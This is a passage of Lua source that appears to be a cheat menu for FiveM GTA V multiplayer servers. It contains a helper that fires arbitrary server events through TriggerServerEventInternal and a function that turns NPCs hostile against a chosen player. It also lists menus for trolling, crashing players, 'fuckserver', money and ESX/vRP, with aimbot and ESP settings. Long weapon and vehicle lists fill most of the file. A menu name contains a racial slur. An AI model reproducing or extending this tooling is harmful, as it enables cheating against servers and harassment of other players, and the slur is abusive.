        if props.modHorns ~= nil then SetVehicleMod(vehicle, 14, props.modHorns, false) end

        if props.modSuspension ~= nil then SetVehicleMod(vehicle, 15, props.modSuspension, false) end

        if props.modArmor ~= nil then SetVehicleMod(vehicle, 16, props.modArmor, false) end

        if props.modTurbo ~= nil then ToggleVehicleMod(vehicle, 18, props.modTurbo) end

        if props.modXenon ~= nil then ToggleVehicleMod(vehicle, 22, props.modXenon) end

        if props.modFrontWheels ~= nil then SetVehicleMod(vehicle, 23, props.modFrontWheels, false) end

        if props.modBackWheels ~= nil then SetVehicleMod(vehicle, 24, props.modBackWheels, false) end
        
        if props.modPlateHolder ~= nil then SetVehicleMod(vehicle, 25, props.modPlateHolder, false) end

        if props.modVanityPlate ~= nil then SetVehicleMod(vehicle, 26, props.modVanityPlate, false) end

        if props.modTrimA ~= nil then SetVehicleMod(vehicle, 27, props.modTrimA, false) end

        if props.modOrnaments ~= nil then SetVehicleMod(vehicle, 28, props.modOrnaments, false) end

        if props.modDashboard ~= nil then SetVehicleMod(vehicle, 29, props.modDashboard, false) end

        if props.modDial ~= nil then SetVehicleMod(vehicle, 30, props.modDial, false) end

        if props.modDoorSpeaker ~= nil then SetVehicleMod(vehicle, 31, props.modDoorSpeaker, false) end

        if props.modSeats ~= nil then SetVehicleMod(vehicle, 32, props.modSeats, false) end

        if props.modSteeringWheel ~= nil then SetVehicleMod(vehicle, 33, props.modSteeringWheel, false) end

        if props.modShifterLeavers ~= nil then SetVehicleMod(vehicle, 34, props.modShifterLeavers, false) end

        if props.modAPlate ~= nil then SetVehicleMod(vehicle, 35, props.modAPlate, false) end

        if props.modSpeakers ~= nil then SetVehicleMod(vehicle, 36, props.modSpeakers, false) end

        if props.modTrunk ~= nil then SetVehicleMod(vehicle, 37, props.modTrunk, false) end

        if props.modHydrolic ~= nil then SetVehicleMod(vehicle, 38, props.modHydrolic, false) end

        if props.modEngineBlock ~= nil then SetVehicleMod(vehicle, 39, props.modEngineBlock, false) end

        if props.modAirFilter ~= nil then SetVehicleMod(vehicle, 40, props.modAirFilter, false) end

        if props.modStruts ~= nil then SetVehicleMod(vehicle, 41, props.modStruts, false) end

        if props.modArchCover ~= nil then SetVehicleMod(vehicle, 42, props.modArchCover, false) end

        if props.modAerials ~= nil then SetVehicleMod(vehicle, 43, props.modAerials, false) end

        if props.modTrimB ~= nil then SetVehicleMod(vehicle, 44, props.modTrimB, false) end

        if props.modTank ~= nil then SetVehicleMod(vehicle, 45, props.modTank, false) end

        if props.modWindows ~= nil then SetVehicleMod(vehicle, 46, props.modWindows, false) end

        if props.modLivery ~= nil then
            SetVehicleMod(vehicle, 48, props.modLivery, false)
            SetVehicleLivery(vehicle, props.modLivery)
        end
    end

    FiveM.DeleteVehicle = function(vehicle)
        SetEntityAsMissionEntity(Object, 1, 1)
        DeleteEntity(Object)
        SetEntityAsMissionEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, 1)
        DeleteEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false))
    end

    FiveM.DirtyVehicle = function(vehicle) SetVehicleDirtLevel(vehicle, 15.0) end

    FiveM.CleanVehicle = function(vehicle) SetVehicleDirtLevel(vehicle, 1.0) end

    FiveM.GetPlayers = function()
        local players    = {}
        for i=0, 255, 1 do
            local ped = GetPlayerPed(i)
            if DoesEntityExist(ped) then
                table.insert(players, i)
            end
        end
        return players
    end

    FiveM.GetClosestPlayer = function(coords)
        local players         = FiveM.GetPlayers()
        local closestDistance = -1
        local closestPlayer   = -1
        local usePlayerPed    = false
        local playerPed       = PlayerPedId()
        local playerId        = PlayerId()

        if coords == nil then
            usePlayerPed = true
            coords       = GetEntityCoords(playerPed)
        end

        for i=1, #players, 1 do
            local target = GetPlayerPed(players[i])

            if not usePlayerPed or (usePlayerPed and players[i] ~= playerId) then
                local targetCoords = GetEntityCoords(target)
                local distance     = GetDistanceBetweenCoords(targetCoords, coords.x, coords.y, coords.z, true)

                if closestDistance == -1 or closestDistance > distance then
                    closestPlayer   = players[i]
                    closestDistance = distance
                end
            end
        end

        return closestPlayer, closestDistance
    end

    FiveM.GetWaypoint = function()
        local g_Waypoint = nil;
        if DoesBlipExist(GetFirstBlipInfoId(8)) then
            local blipIterator = GetBlipInfoIdIterator(8)
            local blip = GetFirstBlipInfoId(8, blipIterator)
            g_Waypoint = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector());
        end
        print(g_Waypoint);
        return g_Waypoint;
    end

    FiveM.GetSafePlayerName = function(name)
        if string.IsNullOrEmpty(name) then return "" end;
        return name:gsub("%^", "\\^"):gsub("%~", "\\~"):gsub("%<", "«"):gsub("%>", "-->");
    end

    FiveM.SetResourceLocked = function(resource, item)
        Citizen.CreateThread(function()
            if item ~= nil then local item_type, item_subtype = item(); end

            if GetResourceState(resource) == "started" then
                if item ~= nil then item:Enabled(true); end;
                if item_subtype == "UIMenuItem" then item:SetRightBadge(BadgeStyle.None); end;
            else
                if item ~= nil then item:Enabled(false); end;
                if item_subtype == "UIMenuItem" then item:SetRightBadge(BadgeStyle.Lock); end;
            end
        end)
    end

    FiveM.TriggerCustomEvent = function(server, event, ...)
        local payload = msgpack.pack({...})
        if server then
            TriggerServerEventInternal(event, payload, payload:len())
        else
            TriggerEventInternal(event, payload, payload:len())
        end
    end
end

local function RequestNetworkControl(Request)
    local hasControl = false
    while hasControl == false do
        hasControl = NetworkRequestControlOfEntity(Request)
        if hasControl == true or hasControl == 1 then
            break
        end
        if
            NetworkHasControlOfEntity(ped) == true and hasControl == true or
                NetworkHasControlOfEntity(ped) == true and hasControl == 1
         then
            return true
        else
            return false
        end
    end
end

local function makePedHostile(target, ped, swat, clone)
    if swat == 1 or swat == true then
        RequestNetworkControl(ped)
        TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
        SetPedCanSwitchWeapon(ped, true)
    else
        if clone == 1 or clone == true then
            local Hash = GetEntityModel(ped)
            if DoesEntityExist(ped) then
                DeletePed(ped)
                RequestModel(Hash)
                local coords = GetEntityCoords(GetPlayerPed(target), true)
                if HasModelLoaded(Hash) then
                    local newPed = CreatePed(21, Hash, coords.x, coords.y, coords.z, 0, 1, 0)
                    if GetEntityHealth(newPed) == GetEntityMaxHealth(newPed) then
                        SetModelAsNoLongerNeeded(Hash)
                        RequestNetworkControl(newPed)
                        TaskCombatPed(newPed, GetPlayerPed(target), 0, 16)
                        SetPedCanSwitchWeapon(ped, true)
                    end
                end
            end
        else
            local TargetHandle = GetPlayerPed(target)
            RequestNetworkControl(ped)
            TaskCombatPed(ped, TargetHandle, 0, 16)
        end
    end
end

local ojtgh = "50.0"

menulist = {
        
       
        'StupidNiggaPaster',
        'player',
        'self',
        'weapon',
        'vehicle',
        'world',
        'misc',
        'teleport',
        'lua',
        'settingslol',
        
        
        'allplayer',
        'playeroptions',
		'troll',
		"crashtroll",
		
        
      
        'appearance',
        'modifyskintextures',
          'modifyhead',
        'modifiers',
		'skinsmodels',
		
        'weaponspawnerplayer',
        'weaponspawner',
		'WeaponCustomization',
		
        
       
        'melee',
        'pistol',
        'shotgun',
        'smg',
        'assault',
        'sniper',
        'thrown',
        'heavy',
        
      
        'vehiclespawner',
        'vehiclemods',
        'vehiclemenu',
		"VehBoostMenu",
        
        'vehiclecolors',
        'vehiclecolors_primary',
        'vehiclecolors_secondary',
        'primary_classic',
        'primary_matte',
        'primary_metal',
        'secondary_classic',
        'secondary_matte',
        'secondary_metal',
        
        'vehicletuning',
        
       
        'compacts',
        'sedans',
        'suvs',
        'coupes',
        'muscle',
        'sportsclassics',
        'sports',
        'super',
        'WWBA',
        'offroad',
        'industrial',
        'utility',
        'vans',
        'cycles',
        'boats',
        'helicopters',
        'planes',
        'service',
        'commercial',
        
        
        'fuckserver',
        'objectspawner',
        'objectlist',
        'weather',
        'time',
        
        'credits',
		'esp',
		'webradio',
        
      
        'saveload',
        'pois',
        
      
        'esx',
        'vrp',
        'other',
		'money',
		'player1',
		'drogas',
		'mecanico',

}



faceItemsList = {}
faceTexturesList = {}
hairItemsList = {}
hairTextureList = {}
maskItemsList = {}
hatItemsList = {}
hatTexturesList = {}


NoclipSpeedOps = {1, 5, 10, 20, 30}

NoclipSpeed = 1
oldSpeed = nil


ForcefieldRadiusOps = {5.0, 10.0, 15.0, 20.0, 50.0}

ForcefieldRadius = 5.0


FastCB = {1.0, 1.09, 1.19, 1.29, 1.39, 1.49}
FastCBWords = {"+0%", "+20%", "+40%", "+60%", "+80%", "+100%"}

FastRunMultiplier = 1.0
FastSwimMultiplier = 1.0


RotationOps = {0, 45, 90, 135, 180}

ObjRotation = 90


GravityOps = {0.0, 5.0, 9.8, 50.0, 100.0, 200.0, 500.0, 1000.0, 9999.9}
GravityOpsWords = {"0", "5", "Default", "50", "100", "200", "500", "1000", "9999"}

GravAmount = 9.8


SpeedModOps = {1.0, 1.5, 2.0, 3.0, 5.0, 10.0, 20.0, 50.0, 100.0, 500.0, 1000.0}
SpeedModAmt = 1.0


ESPDistanceOps = {50.0, 100.0, 500.0, 1000.0, 2000.0, 5000.0,10000.0}
EspDistance = 500.0


ESPRefreshOps = {"0ms", "100ms", "250ms", "500ms", "1s", "2s", "5s"}
ESPRefreshTime = 0


AimbotBoneOps = {"Head", "Chest", "Left Arm", "Right Arm", "Left Leg", "Right Leg", "Dick"}
AimbotBone = "SKEL_HEAD"


ClothingSlots = {1, 2, 3, 4, 5}


PedAttackOps = {"All Weapons", "Melee Weapons", "Pistols", "Heavy Weapons"}

PedAttackType = 1


RadiosList = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18}
RadiosListWords = {
    "Los Santos Rock Radio",
    "Non-Stop-Pop FM",
    "Radio Los Santos",
    "Channel X",
    "West Coast Talk Radio",
    "Rebel Radio",
    "Soulwax FM",
    "East Los FM",
    "West Coast Classics",
    "Blue Ark",
    "Worldwide FM",
    "FlyLo FM",
    "The Lowdown 91.1",
    "The Lab",
    "Radio Mirror Park",
    "Space 103.2",
    "Vinewood Boulevard Radio",
    "Blonded Los Santos 97.8 FM",
    "Blaine County Radio",
	
}


WeathersList = { 
    "CLEAR",
    "EXTRASUNNY",
    "CLOUDS",
    "OVERCAST",
    "RAIN",
    "CLEARING",
    "THUNDER",
    "SMOG",
    "FOGGY",
    "XMAS",
    "SNOWLIGHT",
    "BLIZZARD"
}

objs_tospawn = {
    "stt_prop_stunt_track_start",
    "prop_container_01a",
    "prop_contnr_pile_01a",
    "ce_xr_ctr2",
    "stt_prop_ramp_jump_xxl",
    "hei_prop_carrier_jet",
    "prop_parking_hut_2",
    "csx_seabed_rock3_",
    "db_apart_03_",
    "db_apart_09_",
    "stt_prop_stunt_tube_l",
    "stt_prop_stunt_track_dwuturn",
    "xs_prop_hamburgher_wl",
    "sr_prop_spec_tube_xxs_01a",
	"prop_air_bigradar",
	"p_tram_crash_s",
	"prop_windmill_01",
	"prop_start_gate_01",
	"prop_trailer_01_new",
	"sr_prop_sr_track_block_01",
	"sr_prop_spec_tube_xxs_04a",
	"stt_prop_stunt_soccer_sball",
	"stt_prop_stunt_track_cutout",
	"stt_prop_stunt_target_small",
	"prop_cj_big_boat",
}


local allweapons = {
    "WEAPON_UNARMED",
    "WEAPON_KNIFE",
    "WEAPON_KNUCKLE",
    "WEAPON_NIGHTSTICK",
    "WEAPON_HAMMER",
    "WEAPON_BAT",
    "WEAPON_GOLFCLUB",
    "WEAPON_CROWBAR",
    "WEAPON_BOTTLE",
    "WEAPON_DAGGER",
    "WEAPON_HATCHET",
    "WEAPON_MACHETE",
    "WEAPON_FLASHLIGHT",
    "WEAPON_SWITCHBLADE",
    "WEAPON_POOLCUE",
    "WEAPON_PIPEWRENCH",
    

    "WEAPON_GRENADE",
    "WEAPON_STICKYBOMB",
    "WEAPON_PROXMINE",
    "WEAPON_BZGAS",
    "WEAPON_SMOKEGRENADE",
    "WEAPON_MOLOTOV",
    "WEAPON_FIREEXTINGUISHER",
    "WEAPON_PETROLCAN",
    "WEAPON_SNOWBALL",
    "WEAPON_FLARE",
    "WEAPON_BALL",
    

    "WEAPON_PISTOL",
    "WEAPON_PISTOL_MK2",
    "WEAPON_COMBATPISTOL",
    "WEAPON_APPISTOL",
    "WEAPON_REVOLVER",
    "WEAPON_REVOLVER_MK2",
    "WEAPON_DOUBLEACTION",
    "WEAPON_PISTOL50",
    "WEAPON_SNSPISTOL",
    "WEAPON_SNSPISTOL_MK2",
    "WEAPON_HEAVYPISTOL",
    "WEAPON_VINTAGEPISTOL",
    "WEAPON_STUNGUN",
    "WEAPON_FLAREGUN",
    "WEAPON_MARKSMANPISTOL",
    "WEAPON_RAYPISTOL",
    

    "WEAPON_MICROSMG",
    "WEAPON_MINISMG",
    "WEAPON_SMG",
    "WEAPON_SMG_MK2",
    "WEAPON_ASSAULTSMG",
    "WEAPON_COMBATPDW",
    "WEAPON_GUSENBERG",
    "WEAPON_MACHINEPISTOL",
    "WEAPON_MG",
    "WEAPON_COMBATMG",
    "WEAPON_COMBATMG_MK2",
    "WEAPON_RAYCARBINE",
    

    "WEAPON_ASSAULTRIFLE",
    "WEAPON_ASSAULTRIFLE_MK2",
    "WEAPON_CARBINERIFLE",
    "WEAPON_CARBINERIFLE_MK2",
    "WEAPON_ADVANCEDRIFLE",
    "WEAPON_SPECIALCARBINE",
    "WEAPON_SPECIALCARBINE_MK2",
    "WEAPON_BULLPUPRIFLE",
    "WEAPON_BULLPUPRIFLE_MK2",
    "WEAPON_COMPACTRIFLE",
    

    "WEAPON_PUMPSHOTGUN",
    "WEAPON_PUMPSHOTGUN_MK2",
    "WEAPON_SWEEPERSHOTGUN",
    "WEAPON_SAWNOFFSHOTGUN",
    "WEAPON_BULLPUPSHOTGUN",
    "WEAPON_ASSAULTSHOTGUN",
    "WEAPON_MUSKET",
    "WEAPON_HEAVYSHOTGUN",
    "WEAPON_DBSHOTGUN",
    

    "WEAPON_SNIPERRIFLE",
    "WEAPON_HEAVYSNIPER",
    "WEAPON_HEAVYSNIPER_MK2",
    "WEAPON_MARKSMANRIFLE",
    "WEAPON_MARKSMANRIFLE_MK2",
    

    "WEAPON_GRENADELAUNCHER",
    "WEAPON_GRENADELAUNCHER_SMOKE",
    "WEAPON_RPG",
    "WEAPON_MINIGUN",
    "WEAPON_FIREWORK",
    "WEAPON_RAILGUN",
    "WEAPON_HOMINGLAUNCHER",
    "WEAPON_COMPACTLAUNCHER",
    "WEAPON_RAYMINIGUN",
}

local meleeweapons = {
    {"WEAPON_KNIFE", "Knife"},
    {"WEAPON_KNUCKLE", "Brass Knuckles"},
    {"WEAPON_NIGHTSTICK", "Nightstick"},
    {"WEAPON_HAMMER", "Hammer"},
    {"WEAPON_BAT", "Baseball Bat"},
    {"WEAPON_GOLFCLUB", "Golf Club"},
    {"WEAPON_CROWBAR", "Crowbar"},
    {"WEAPON_BOTTLE", "Bottle"},
    {"WEAPON_DAGGER", "Dagger"},
    {"WEAPON_HATCHET", "Hatchet"},
    {"WEAPON_MACHETE", "Machete"},
    {"WEAPON_FLASHLIGHT", "Flashlight"},
    {"WEAPON_SWITCHBLADE", "Switchblade"},
    {"WEAPON_POOLCUE", "Pool Cue"},
    {"WEAPON_PIPEWRENCH", "Pipe Wrench"}
}

local thrownweapons = {
    {"WEAPON_GRENADE", "Grenade"},
    {"WEAPON_STICKYBOMB", "Sticky Bomb"},
    {"WEAPON_PROXMINE", "Proximity Mine"},
    {"WEAPON_BZGAS", "BZ Gas"},
    {"WEAPON_SMOKEGRENADE", "Smoke Grenade"},
    {"WEAPON_MOLOTOV", "Molotov"},
    {"WEAPON_FIREEXTINGUISHER", "Fire Extinguisher"},
    {"WEAPON_PETROLCAN", "Fuel Can"},
    {"WEAPON_SNOWBALL", "Snowball"},
    {"WEAPON_FLARE", "Flare"},
    {"WEAPON_BALL", "Baseball"}
}

local pistolweapons = {
    {"WEAPON_PISTOL", "Pistol"},
    {"WEAPON_PISTOL_MK2", "Pistol Mk II"},
    {"WEAPON_COMBATPISTOL", "Combat Pistol"},
    {"WEAPON_APPISTOL", "AP Pistol"},
    {"WEAPON_REVOLVER", "Revolver"},
    {"WEAPON_REVOLVER_MK2", "Revolver Mk II"},
    {"WEAPON_DOUBLEACTION", "Double Action Revolver"},
    {"WEAPON_PISTOL50", "Pistol .50"},
    {"WEAPON_SNSPISTOL", "SNS Pistol"},
    {"WEAPON_SNSPISTOL_MK2", "SNS Pistol Mk II"},
    {"WEAPON_HEAVYPISTOL", "Heavy Pistol"},
    {"WEAPON_VINTAGEPISTOL", "Vintage Pistol"},
    {"WEAPON_STUNGUN", "Tazer"},
    {"WEAPON_FLAREGUN", "Flaregun"},
    {"WEAPON_MARKSMANPISTOL", "Marksman Pistol"},
    {"WEAPON_RAYPISTOL", "Up-n-Atomizer"}
}

local smgweapons = {
    {"WEAPON_MICROSMG", "Micro SMG"},
    {"WEAPON_MINISMG", "Mini SMG"},
    {"WEAPON_SMG", "SMG"},
    {"WEAPON_SMG_MK2", "SMG Mk II"},
    {"WEAPON_ASSAULTSMG", "Assault SMG"},
    {"WEAPON_COMBATPDW", "Combat PDW"},
    {"WEAPON_GUSENBERG", "Gunsenberg"},
    {"WEAPON_MACHINEPISTOL", "Machine Pistol"},
    {"WEAPON_MG", "MG"},
    {"WEAPON_COMBATMG", "Combat MG"},
    {"WEAPON_COMBATMG_MK2", "Combat MG Mk II"},
    {"WEAPON_RAYCARBINE", "Unholy Hellbringer"}
}

local assaultweapons = {
    {"WEAPON_ASSAULTRIFLE", "Assault Rifle"},
    {"WEAPON_ASSAULTRIFLE_MK2", "Assault Rifle Mk II"},
    {"WEAPON_CARBINERIFLE", "Carbine Rifle"},
    {"WEAPON_CARBINERIFLE_MK2", "Carbine Rigle Mk II"},
    {"WEAPON_ADVANCEDRIFLE", "Advanced Rifle"},
    {"WEAPON_SPECIALCARBINE", "Special Carbine"},
    {"WEAPON_SPECIALCARBINE_MK2", "Special Carbine Mk II"},
    {"WEAPON_BULLPUPRIFLE", "Bullpup Rifle"},
    {"WEAPON_BULLPUPRIFLE_MK2", "Bullpup Rifle Mk II"},
    {"WEAPON_COMPACTRIFLE", "Compact Rifle"}
}

local shotgunweapons = {
    {"WEAPON_PUMPSHOTGUN", "Pump Shotgun"},
    {"WEAPON_PUMPSHOTGUN_MK2", "Pump Shotgun Mk II"},
    {"WEAPON_SWEEPERSHOTGUN", "Sweeper Shotgun"},
    {"WEAPON_SAWNOFFSHOTGUN", "Sawed-Off Shotgun"},
    {"WEAPON_BULLPUPSHOTGUN", "Bullpup Shotgun"},
    {"WEAPON_ASSAULTSHOTGUN", "Assault Shotgun"},
    {"WEAPON_MUSKET", "Musket"},
    {"WEAPON_HEAVYSHOTGUN", "Heavy Shotgun"},
    {"WEAPON_DBSHOTGUN", "Double Barrel Shotgun"}
}

local sniperweapons = {
    {"WEAPON_SNIPERRIFLE", "Sniper Rifle"},
    {"WEAPON_HEAVYSNIPER", "Heavy Sniper"},
    {"WEAPON_HEAVYSNIPER_MK2", "Heavy Sniper Mk II"},
    {"WEAPON_MARKSMANRIFLE", "Marksman Rifle"},
    {"WEAPON_MARKSMANRIFLE_MK2", "Marksman Rifle Mk II"}
}

local heavyweapons = {
    {"WEAPON_GRENADELAUNCHER", "Grenade Launcher"},
    {"WEAPON_RPG", "RPG"},
    {"WEAPON_MINIGUN", "Minigun"},
    {"WEAPON_FIREWORK", "Firework Launcher"},
    {"WEAPON_RAILGUN", "Railgun"},
    {"WEAPON_HOMINGLAUNCHER", "Homing Launcher"},
    {"WEAPON_COMPACTLAUNCHER", "Compact Grenade Launcher"},
    {"WEAPON_RAYMINIGUN", "Widowmaker"}
}

local compacts = {
    "BLISTA",
    "BRIOSO",
    "DILETTANTE",
    "DILETTANTE2",
    "ISSI2",
    "ISSI3",
    "ISSI4",
    "ISSI5",
    "ISSI6",
    "PANTO",
    "PRAIRIE",
    "RHAPSODY"
}

local sedans = {
    "ASEA",
    "ASEA2",
    "ASTEROPE",
    "COG55",
    "COG552",
    "COGNOSCENTI",
    "COGNOSCENTI2",
    "EMPEROR",
    "EMPEROR2",
    "EMPEROR3",
    "FUGITIVE",
    "GLENDALE",
    "INGOT",
    "INTRUDER",
    "LIMO2",
    "PREMIER",
    "PRIMO",
    "PRIMO2",
    "REGINA",
    "ROMERO",
    "SCHAFTER2",
    "SCHAFTER5",
    "SCHAFTER6",
    "STAFFORD",
    "STANIER",
    "STRATUM",
    "STRETCH",
    "SUPERD",
    "SURGE",
    "TAILGATER",
    "WARRENER",
    "WASHINGTON"
}

local suvs = {
    "BALLER",
    "BALLER2",
    "BALLER3",
    "BALLER4",
    "BALLER5",
    "BALLER6",
    "BJXL",
    "CAVALCADE",
    "CAVALCADE2",
    "CONTENDER",
    "DUBSTA",
    "DUBSTA2",
    "FQ2",
    "GRANGER",
    "GRESLEY",
    "HABANERO",
    "HUNTLEY",
    "LANDSTALKER",
    "MESA",
    "MESA2",
    "PATRIOT",
    "PATRIOT2",
    "RADI",
    "ROCOTO",
    "SEMINOLE",
    "SERRANO",
    "TOROS",
    "XLS",
    "XLS2"
}

local coupes = {
    "COGCABRIO",
    "EXEMPLAR",
    "F620",
    "FELON",
    "FELON2",
    "JACKAL",
    "ORACLE",
    "ORACLE2",
    "SENTINEL",
    "SENTINEL2",
    "WINDSOR",
    "WINDSOR2",
    "ZION",
    "ZION2"
}

local muscle = {
    "BLADE",
    "BUCCANEER",
    "BUCCANEER2",
    "CHINO",
    "CHINO2",
    "CLIQUE",
    "COQUETTE3",
    "DEVIANT",
    "DOMINATOR",
    "DOMINATOR2",
    "DOMINATOR3",
    "DOMINATOR4",
    "DOMINATOR5",
    "DOMINATOR6",
    "DUKES",
    "DUKES2",
    "ELLIE",
    "FACTION",
    "FACTION2",
    "FACTION3",
    "GAUNTLET",
    "GAUNTLET2",
    "HERMES",
    "HOTKNIFE",
    "HUSTLER",
    "IMPALER",
    "IMPALER2",
    "IMPALER3",
    "IMPALER4",
    "IMPERATOR",
    "IMPERATOR2",
    "IMPERATOR3",
    "LURCHER",
    "MOONBEAM",
    "MOONBEAM2",
    "NIGHTSHADE",
    "PHOENIX",
    "PICADOR",
    "RATLOADER",
    "RATLOADER2",
    "RUINER",
    "RUINER2",
    "RUINER3",
    "SABREGT",
    "SABREGT2",
    "SLAMVAN",
    "SLAMVAN2",
    "SLAMVAN3",
    "SLAMVAN4",
    "SLAMVAN5",
    "SLAMVAN6",
    "STALION",
    "STALION2",
    "TAMPA",
    "TAMPA3",
    "TULIP",
    "VAMOS",
    "VIGERO",
    "VIRGO",
    "VIRGO2",
    "VIRGO3",
    "VOODOO",
    "VOODOO2",
    "YOSEMITE"
}

local sportsclassics = {
    "ARDENT",
    "BTYPE",
    "BTYPE2",
    "BTYPE3",
    "CASCO",
    "CHEBUREK",
    "CHEETAH2",
    "COQUETTE2",
    "DELUXO",
    "FAGALOA",
    "FELTZER3",
    "GT500",
    "INFERNUS2",
    "JB700",
    "JESTER3",
    "MAMBA",
    "MANANA",
    "MICHELLI",
    "MONROE",
    "PEYOTE",
    "PIGALLE",
    "RAPIDGT3",
    "RETINUE",
    "SAVESTRA",
    "STINGER",
    "STINGERGT",
    "STROMBERG",
    "SWINGER",
    "TORERO",
    "TORNADO",
    "TORNADO2",
    "TORNADO3",
    "TORNADO4",
    "TORNADO5",
    "TORNADO6",
    "TURISMO2",
    "VISERIS",
    "Z190",
    "ZTYPE"
}

local sports = {
    "ALPHA",
    "BANSHEE",
    "BESTIAGTS",
    "BLISTA2",
    "BLISTA3",
    "BUFFALO",
    "BUFFALO2",
    "BUFFALO3",
    "CARBONIZZARE",
    "COMET2",
    "COMET3",
    "COMET4",
    "COMET5",
    "COQUETTE",
    "ELEGY",
    "ELEGY2",
    "FELTZER2",
    "FLASHGT",
    "FUROREGT",
    "FUSILADE",
    "FUTO",
    "GB200",
    "HOTRING",
    "ITALIGTO",
    "JESTER",
    "JESTER2",
    "KHAMELION",
    "KURUMA",
    "KURUMA2",
    "LYNX",
    "MASSACRO",
    "MASSACRO2",
    "NEON",
    "NINEF",
    "NINEF2",
    "OMNIS",
    "PARIAH",
    "PENUMBRA",
    "RAIDEN",
    "RAPIDGT",
    "RAPIDGT2",
    "RAPTOR",
    "REVOLTER",
    "RUSTON",
    "SCHAFTER2",
    "SCHAFTER3",
    "SCHAFTER4",
    "SCHAFTER5",
    "SCHLAGEN",
    "SCHWARZER",
    "SENTINEL3",
    "SEVEN70",
    "SPECTER",
    "SPECTER2",
    "SULTAN",
    "SURANO",
    "TAMPA2",
    "TROPOS",
    "VERLIERER2",
    "ZR380",
    "ZR3802",
    "ZR3803"
}

local super = {
    "ADDER",
    "AUTARCH",
    "BANSHEE2",
    "BULLET",
    "CHEETAH",
    "CYCLONE",
    "DEVESTE",
    "ENTITYXF",
    "ENTITY2",
    "FMJ",
    "GP1",
    "INFERNUS",
    "ITALIGTB",
    "ITALIGTB2",
    "LE7B",
    "NERO",
    "NERO2",
    "OSIRIS",
    "PENETRATOR",
    "PFISTER811",
    "PROTOTIPO",
    "REAPER",
    "SC1",
    "SCRAMJET",
    "SHEAVA",
    "SULTANRS",
    "T20",
    "TAIPAN",
    "TEMPESTA",
    "TEZERACT",
    "TURISMOR",
    "TYRANT",
    "TYRUS",
    "VACCA",
    "VAGNER",
    "VIGILANTE",
    "VISIONE",
    "VOLTIC",
    "VOLTIC2",
    "XA21",
    "ZENTORNO"
}

local WWBA = {
    "NEON",
	"SULTAN",
	"SULTANRS",
	"C7",
	"C8",
	"NQSRT",
    "Charger",
	"CONTGT2011",
	"CHALLENGER",
	"C63HR",
	"reaper",
	"7rbj",
	"rmodmustang",
	"b6mr",
	"rmode63s",
	"MUSTANG",
	"rmodzl1",
	"SVOLITO2",
	"DUBSTA",
	"venom"
}

local offroad = {
    "BFINJECTION",
    "BIFTA",
    "BLAZER",
    "BLAZER2",
    "BLAZER3",
    "BLAZER4",
    "BLAZER5",
    "BODHI2",
    "BRAWLER",
    "BRUISER",
    "BRUISER2",
    "BRUISER3",
    "BRUTUS",
    "BRUTUS2",
    "BRUTUS3",
    "CARACARA",
    "DLOADER",
    "DUBSTA3",
    "DUNE",
    "DUNE2",
    "DUNE3",
    "DUNE4",
    "DUNE5",
    "FREECRAWLER",
    "INSURGENT",
    "INSURGENT2",
    "INSURGENT3",
    "KALAHARI",
    "KAMACHO",
    "MARSHALL",
    "MENACER",
    "MESA3",
    "MONSTER",
    "MONSTER3",
    "MONSTER4",
    "MONSTER5",
    "NIGHTSHARK",
    "RANCHERXL",
    "RANCHERXL2",
    "RCBANDITO",
    "REBEL",
    "REBEL2",
    "RIATA",
    "SANDKING",
    "SANDKING2",
    "TECHNICAL",
    "TECHNICAL2",
    "TECHNICAL3",
    "TROPHYTRUCK",
    "TROPHYTRUCK2"
}

local industrial = {
    "BULLDOZER",
    "CUTTER",
    "DUMP",
    "FLATBED",
    "GUARDIAN",
    "HANDLER",
    "MIXER",
    "MIXER2",
    "RUBBLE",
    "TIPTRUCK",
    "TIPTRUCK2"
}

local utility = {
    "AIRTUG",
    "CADDY",
    "CADDY2",
    "CADDY3",
    "DOCKTUG",
    "FORKLIFT",
    "TRACTOR2",
    "TRACTOR3",
    "MOWER",
    "RIPLEY",
    "SADLER",
    "SADLER2",
    "SCRAP",
    "TOWTRUCK",
    "TOWTRUCK2",
    "TRACTOR",
    "UTILLITRUCK",
    "UTILLITRUCK2",
    "UTILLITRUCK3",
    "ARMYTRAILER",
    "ARMYTRAILER2",
    "FREIGHTTRAILER",
    "ARMYTANKER",
    "TRAILERLARGE",
    "DOCKTRAILER",
    "TR3",
    "TR2",
    "TR4",
    "TRFLAT",
    "TRAILERS",
    "TRAILERS4",
    "TRAILERS2",
    "TRAILERS3",
    "TVTRAILER",
    "TRAILERLOGS",
    "TANKER",
    "TANKER2",
    "BALETRAILER",
    "GRAINTRAILER",
    "BOATTRAILER",
    "RAKETRAILER",
    "TRAILERSMALL"
}

local vans = {
    "BISON",
    "BISON2",
    "BISON3",
    "BOBCATXL",
    "BOXVILLE",
    "BOXVILLE2",
    "BOXVILLE3",
    "BOXVILLE4",
    "BOXVILLE5",
    "BURRITO",
    "BURRITO2",
    "BURRITO3",
    "BURRITO4",
    "BURRITO5",
    "CAMPER",
    "GBURRITO",
    "GBURRITO2",
    "JOURNEY",
    "MINIVAN",
    "MINIVAN2",
    "PARADISE",
    "PONY",
    "PONY2",
    "RUMPO",
    "RUMPO2",
    "RUMPO3",
    "SPEEDO",
    "SPEEDO2",
    "SPEEDO4",
    "SURFER",
    "SURFER2",
    "TACO",
    "YOUGA",
    "YOUGA2"
}

local cycles = {
    "BMX",
    "CRUISER",
    "FIXTER",
    "SCORCHER",
    "TRIBIKE",
    "TRIBIKE2",
    "TRIBIKE3"
}

local boats = {
    "DINGHY",
    "DINGHY2",
    "DINGHY3",
    "DINGHY4",
    "JETMAX",
    "MARQUIS",
    "PREDATOR",
    "SEASHARK",
    "SEASHARK2",
    "SEASHARK3",
    "SPEEDER",
    "SPEEDER2",
    "SQUALO",
    "SUBMERSIBLE",
    "SUBMERSIBLE2",
    "SUNTRAP",
    "TORO",
    "TORO2",
    "TROPIC",
    "TROPIC2",
    "TUG"
}

local helicopters = {
    "AKULA",
    "ANNIHILATOR",
    "BUZZARD",
    "BUZZARD2",
    "CARGOBOB",
    "CARGOBOB2",
    "CARGOBOB3",
    "CARGOBOB4",
    "FROGGER",
    "FROGGER2",
    "HAVOK",
    "HUNTER",
    "MAVERICK",
    "POLMAV",
    "SAVAGE",
    "SEASPARROW",
    "SKYLIFT",
    "SUPERVOLITO",
    "SUPERVOLITO2",
